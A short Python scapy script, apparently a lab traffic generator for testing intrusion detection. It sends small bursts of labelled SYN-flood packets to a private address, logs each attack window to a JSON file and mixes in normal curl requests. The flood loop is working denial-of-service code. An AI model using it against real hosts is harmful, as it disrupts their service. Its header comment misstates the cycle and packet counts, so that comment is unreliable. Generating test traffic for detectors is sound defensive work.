from scapy.all import IP, TCP, send
import random
import os
import time
import json

# Target Configuration
target_ip = "10.0.0.10"
target_port = 80

# We will run 10 cycles of 5 malicious packets followed by 1 safe packet

start_time = time.time()

for cycle in range(3):
    print(f"\n--- Cycle {cycle + 1} ---")
    
    start_time = time.time()
    
    # 1. SEND MALICIOUS TRAFFIC (SYN Flood)
    for i in range(30):
        mal_packet = IP(dst=target_ip)/TCP(
            sport=random.randint(1024, 65535), 
            dport=target_port, 
            flags="S", 
        )
        send(mal_packet, verbose=False)
        print(f"[!] MALICIOUS: SYN Packet sent")
    time.sleep(1)
    end_time = time.time()
    attack_event = {
        "attack_type": "Syn Flood",
        "start": start_time,
        "end": end_time
    }
    with open("../attack_log.json", "a") as log:
        log.write(json.dumps(attack_event) + "\n")
    print("\n[+] Attack time window logged to attack_log.json")

    time.sleep(.5)
    # 2. SEND SAFE TRAFFIC (Normal User Activity)
    # curl uses a standard, valid TCP handshake
    os.system(f"curl -s --connect-timeout 1 {target_ip} > /dev/null")
    
    time.sleep(0.5)